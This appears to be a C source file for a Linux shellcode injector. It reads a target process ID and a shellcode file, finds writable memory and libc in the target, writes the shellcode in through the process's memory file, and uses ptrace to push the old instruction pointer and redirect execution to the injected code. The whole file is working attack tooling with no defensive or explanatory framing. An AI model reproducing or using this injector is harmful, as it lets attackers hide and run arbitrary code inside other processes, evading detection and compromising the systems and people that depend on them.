#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include "proc.h"
#include "vmap.h"

void emu_push(pid_t pid,struct user_regs_struct *regs,
	unsigned long value)
{
#ifdef __i386__
	regs->esp -= sizeof(unsigned long);
	if(ptrace(PTRACE_POKEDATA,pid,regs->esp,value) < 0)
		perror("ptrace_pokedata");
#elif __x86_64__
	regs->rsp -= sizeof(unsigned long);
	if(ptrace(PTRACE_POKEDATA,pid,regs->rsp,value) < 0)
		perror("ptrace_pokedata");
#endif
}

int main(int argc,char** argv)
{
	pid_t pid = atoi(argv[1]);
	struct user_regs_struct regs;
	struct stat st;
	vmap_t shell,libc;
	void* local_shell;
	int fd,pd,wr;
	
	if(vmap_reqeust(pid,VMAP_WALK_SHELL,&shell) < 0)
	{
		fputs("[-] Place for shellcode not found!\n",stderr);
		exit(0);
	}
	
	if(vmap_reqeust(pid,VMAP_WALK_LIBC,&libc) < 0)
	{
		fputs("[-] Libc not found!\n",stderr);
		exit(0);
	}
	
	if((fd = open(argv[2],O_RDONLY)) < 0)
	{
		perror("open shellcode file");
		exit(1);
	}
	
	if(fstat(fd,&st))
	{
		perror("fstat");
		close(fd);
		exit(1);
	}
	
	local_shell = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,fd,0);
	if(local_shell == MAP_FAILED)
	{
		perror("mmap");
		close(fd);
		exit(1);
	}
	
	suspend_proc(pid,true);
	
	if((pd = open_proc(pid)) < 0)
	{
		perror("open_proc");
		suspend_proc(pid,false);
		exit(1);
	}
	
	printf("%lx-%lx\n",shell.vm_start,shell.vm_end);
	
	if((wr = pwrite(pd,(void*)local_shell,
		st.st_size,(off_t)shell.vm_start)) < 0)
	{
		perror("pwrite");
		goto ex;
	}
	else
		printf("[+] Shellcode written %d\n",wr);
	
	ptrace(PTRACE_GETREGS,pid,0,&regs);
#ifdef __i386__
	emu_push(pid,&regs,regs.eip);
	emu_push(pid,&regs,regs.ebx);
	
	regs.eip = (unsigned long)shell.vm_start+2;
	regs.ebx = (unsigned long)libc.vm_start;
#elif __x86_64__
	emu_push(pid,&regs,regs.rip);
	emu_push(pid,&regs,regs.rbx);
	
	regs.rip = (unsigned long)shell.vm_start+2;
	regs.rbx = (unsigned long)libc.vm_start;
#endif

	ptrace(PTRACE_SETREGS,pid,0,&regs);
ex:
	suspend_proc(pid,false);
	
	munmap(local_shell,st.st_size);
	close_proc(pd);
	close(fd);
	return 0;
}
